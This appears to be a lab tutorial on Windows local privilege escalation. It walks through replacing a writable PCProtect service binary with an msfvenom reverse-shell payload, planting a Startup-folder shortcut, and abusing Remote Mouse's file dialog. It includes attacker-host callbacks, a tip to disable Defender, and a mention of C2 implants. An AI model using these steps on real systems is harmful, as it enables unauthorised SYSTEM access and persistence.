# Windows Local Privilege Escalation - Applications for CTF Creators


# Applications

Certain vulnerabilities in applications can lead to privilege escalation. These can range from path hijacking to DLL hijacking and others as well.

# Privilege Escalation via Vulnerable Applications

There are plenty of more bugs that can lead to privileges escalation such as stack-based buffer overflows.

We can find public exploits in the ExploitDB database, there is a tool named [searchsploit](https://www.exploit-db.com/searchsploit) which is a command line search tool for Exploit-DB that also allows us to take a copy of the exploit database in our systems.

```shell
searcshploit <app-name> windows privilege escalation
searcshploit <app-name> privilege escalation
searchsploit <app-name> windows local privilege escalation
searchsploit <app-name> local privilege escalation
```

# Privilege Escalation via Write Permissions

In this section, we will discuss privilege escalation techniques that involve replacing the executable of a service. An application listed on ExploitDB, [PCProtect 4.8.35](https://www.exploit-db.com/exploits/45503), grants full permissions to any user. The author describes the following:

> The application grants "Everyone: (F)" to the contents of the directory and its subfolders. Additionally, the program installs a service called "SecurityService" which runs under the "Local system account." This configuration allows any user to escalate privileges to "NT AUTHORITY\SYSTEM" by substituting the service's binary with a malicious one.

The proof of concept (PoC) is documented on the exploit page. We will follow those steps after installing the application, which can be [downloaded here](https://www.exploit-db.com/apps/ddcc3319288a35caa42e561e513d13df-PCProtect_Setup%20(1).exe).

```shell
C:\Users\user>icacls "c:\Program Files (x86)\PCProtect"
c:\Program Files (x86)\PCProtect BUILTIN\Users:(OI)(CI)(F)
                                 Everyone:(OI)(CI)(F)
                                 NT SERVICE\TrustedInstaller:(I)(F)
                                 NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                 NT AUTHORITY\SYSTEM:(I)(F)
                                 NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                 BUILTIN\Administrators:(I)(F)
                                 BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                 BUILTIN\Users:(I)(RX)
                                 BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                 CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files

C:\Users\user>sc qc SecurityService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SecurityService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : PC Security Management Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\Users\user>icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files

```

Based on the output above, we have writable permissions to the executable of the service named `SecurityService`. We will set up an SMB server on the attacker host and authenticate to the SMB service.

```shell
❯ sudo impacket-smbserver share . -smb2support -username low -password 'p@ssw0rd'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
```

Now we're gonna authenticate to the SMB service:

```powershell
PS C:\Users\user> $pass = ConvertTo-SecureString 'p@ssw0rd' -AsPlainText -Force

PS C:\Users\user> $cred = New-Object System.Management.Automation.PSCredential('low', $pass)

PS C:\Users\user> New-PSDrive -Name "share" -PSProvider "FileSystem" -Root "\\192.168.119.130\share" -Credential $cred

Name           Used (GB)     Free (GB) Provider      Root                                                                                                                              CurrentLocation
----           ---------     --------- --------      ----                                                                                                                              ---------------
share                                  FileSystem    \\192.168.119.130\share

```

We can view the permissions of the service using the `accesschk` tool:

```powershell
PS C:\Users\user> C:\Tools\SysinternalsSuite\accesschk.exe /accepteula -kvuqsw "HKLM\System\CurrentControlSet\Services" >> \\192.168.119.130\share\services.txt
```

The `services.txt` file should have stored the output of the previous command and it should have returned us the permissions we have for the target service:

```txt
HKLM\System\CurrentControlSet\Services\EventLog\Application\SecurityService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Administrators
	KEY_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
	KEY_ALL_ACCESS

HKLM\System\CurrentControlSet\Services\SecurityService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Administrators
	KEY_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
	KEY_ALL_ACCESS
```

The output indicates that only the Administrators group and the NT AUTHORITY\SYSTEM have full access to the registry keys of this service.

```powershell
PS C:\Users\user> whoami
desktop-bn\user

PS C:\Users\user> whoami /groups | findstr /i 'Administrators'
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
```

Since we are part of the Administrators group, we can exploit this by replacing "SecurityService.exe" with our preferred payload or implant and wait for execution upon reboot.

For this demonstration, I will use an msfvenom-generated payload.

```shell
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.130 LPORT=443 -f exe -o reverse.exe
```

> Note: In the real-world you would replace it with an implant or an encrypted payload of a C2.

We'll create a backup of the original service executable/binary:

```powershell
copy "C:\Program Files (x86)\PCProtect\SecurityService.exe" "C:\Program Files (x86)\PCProtect\SecurityService-Backup.exe"
```

Now we're gonna transfer the payload through the SMB protocol:

```powershell
copy \\192.168.119.130\share\reverse.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

> Note: Make sure to disable the Microsoft Defender Real-Time Protection or any other real time scanner.

The executable should run upon system restart, specifically when the system reaches the logon window (the screen where the user signs in). At this point, we should receive the reverse shell:

```powershell
PS C:\Users\user> shutdown /r /t 0
```

As expected we escalated our privileges from a default user to `NT AUTHORITY\SYSTEM`:

```shell
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.119.130] from (UNKNOWN) [192.168.119.129] 49670
Microsoft Windows [Version 10.0.22000.493]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name           SID
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384


<SNIP>
```

# Privilege Escalation via Startup Applications

Run a command prompt or PowerShell console as an administrator and grant full permissions to the startup directory:

```powershell
PS C:\Windows\system32> icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" /grant "BUILTIN\Users:F"
processed file: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
Successfully processed 1 files; Failed processing 0 files
```

Verify that the permissions have been applied:

```powershell
PS C:\Windows\system32> icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
                                                             S-1-5-21-264094270-2388996790-3434637240-1000:(I)(OI)(CI)(DE,DC)
                                                             DESKTOP-BN\user:(I)(OI)(CI)(DE,DC)
                                                             DESKTOP-BN\Administrator:(I)(OI)(CI)(DE,DC)
                                                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                                             BUILTIN\Administrators:(I)(OI)(CI)(F)
                                                             BUILTIN\Users:(I)(OI)(CI)(RX)
                                                             Everyone:(I)(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files  
```

As we can see, the `Users` group can write to the Startup directory. Therefore, we can create a malicious binary or implant and place it in that directory.

```powershell
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\reverse.lnk")
$Shortcut.TargetPath = "C:\Tools\reverse.exe"
$Shortcut.Save()
```

In a low-privileged user (default user) command prompt or PowerShell console, execute the script:

```powershell
PS C:\Users\user> powershell.exe /c "C:\Tools\CreateShortcut.ps1"
```

Check if the shortcut was created:

```powershell

PS C:\Users\user> dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\reverse.lnk"


    Directory: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2022   4:41 PM            611 reverse.lnk
```

Start a listener on the attacker host and then simulate an Administrator login using RDP. After a while, we should receive a shell running as an administrator:

```shell
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.119.130] from (UNKNOWN) [192.168.119.129] 49898
Microsoft Windows [Version 10.0.22000.493]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name                     SID
============================= ============================================
desktop-bn\administrator S-1-5-21-264094270-2388996790-3434637240-500


GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes                                         
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group 
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Performance Log Users                                 Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group 
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group 
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group 
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group 
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288                                                    

<SNIP>
```

# Privilege Escalation via Insecure GUI Applications

The application [Remote Mouse GUI version 3.008](https://www.exploit-db.com/exploits/50047) is vulnerable to a local privilege escalation technique, which is the ability to open any binary as administrator, this includes a terminal/console. The author specifies the steps to reproduce:

> 1. Open Remote Mouse from the system tray
> 2. Go to "Settings"
> 3. Click "Change..." in "Image Transfer Folder" section
> 4. "Save As" prompt will appear
> 5. Enter "C:\Windows\System32\cmd.exe" in the address bar
> 6. A new command prompt is spawned with Administrator privileges

We'll do those steps once we install the application. We'll [download](https://www.exploit-db.com/apps/4e06b0e24ad2dbf6fde0da11b77dd98d-RemoteMouse.exe) the application, install it and then run it:

![[uac-remote-mouse.png]]

{{< image src="/images/posts/uac-remote-mouse.png" caption="UAC Remote Mouse " src_s="/images/posts/uac-remote-mouse.png" src_l="/images/posts/uac-remote-mouse.png" >}}

Open the program from the system tray:

{{< image src="/images/posts/mouse-open.png" caption="Mouse Open " src_s="/images/posts/mouse-open.png" src_l="/images/posts/mouse-open.png" >}}

Then click on the `Settings` tab and from there click on the `"Change..."` button in the "`Image Transfer Folder`" section

{{< image src="/images/posts/remote-mouse-settings.png" caption="Remote Mouse Settings " src_s="/images/posts/remote-mouse-settings.png" src_l="/images/posts/remote-mouse-settings.png" >}}

Enter "`C:\Windows\System32\cmd.exe`" in the address bar:

{{< image src="/images/posts/open-cmd-right.png" caption="Open CMD Settings " src_s="/images/posts/open-cmd-right.png" src_l="/images/posts/open-cmd-right.png" >}}

As the author describes, a new command prompt is spawned with **System** privileges:

{{< image src="/images/posts/cmd-as-admin 1.png" caption="CMD as Administrator " src_s="/images/posts/cmd-as-admin 1.png" src_l="/images/posts/cmd-as-admin 1.png" >}}



